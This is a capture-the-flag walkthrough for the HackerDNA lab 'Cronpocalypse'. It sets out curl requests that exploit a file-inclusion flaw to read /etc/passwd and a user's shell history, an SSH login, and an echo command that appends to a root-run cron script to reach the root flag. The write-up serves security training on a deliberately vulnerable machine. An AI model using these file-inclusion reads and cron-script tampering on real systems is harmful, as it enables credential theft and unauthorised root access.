![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat)
![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
![Platform](https://img.shields.io/badge/Platform-HackerDNA-blue)
![Cronpocalypse](https://img.shields.io/badge/Cronpocalypse-LFI%20%2B%20Cron%20Escalation-darkred?style=flat&logo=linux&logoColor=white)


# Cronpocalypse

**Platform:** HackerDNA  
**Difficulty:** Easy  
**Flags:** 2  

## Objective  
Identify a Local File Inclusion vulnerability to obtain user credentials, SSH into the machine, and escalate to root by abusing a misconfigured cron job.

## Steps  

1. Start the machine in HackerDNA and open the provided IP in your browser.  
2. The page loads a fake “FakeCorp” interface. Click **Explore Features**.  
3. Under “Read Files,” test the input field. The parameter `read?file=` is vulnerable to LFI.  
4. Enumerate the filesystem:  
   - `curl http://<IP>/read?file=/etc/passwd`  
5. Check the ctf user’s history:  
   - `curl http://<IP>/read?file=/home/ctf/.bash_history`  
6. Extract the password from the history file:  
   - `ctf:S******************d!`  
7. SSH into the machine as the ctf user:  
   - `ssh ctf@<IP>`  
8. Enumerate cron directories to find a writable script:  
   - `ls -la /etc/cron.*`  
9. Inspect the vulnerable script (commonly in `/etc/cron.hourly/`):  
   - `cat /etc/cron.hourly/backup.sh`  
10. Append a command to copy the root flag into the ctf home directory:  
    - `echo "cp /root/flag.txt /home/ctf/root-flag.txt" >> /etc/cron.hourly/backup.sh`  
11. Wait for the cron job to run (runs as root).  
12. Read the root flag from your home directory:  
    - `cat /home/ctf/root-flag.txt`  

## Flag  
User flag: Retrieved from `/home/ctf/flag-user.txt`  
Root flag: Retrieved from `/home/ctf/root-flag.txt`  

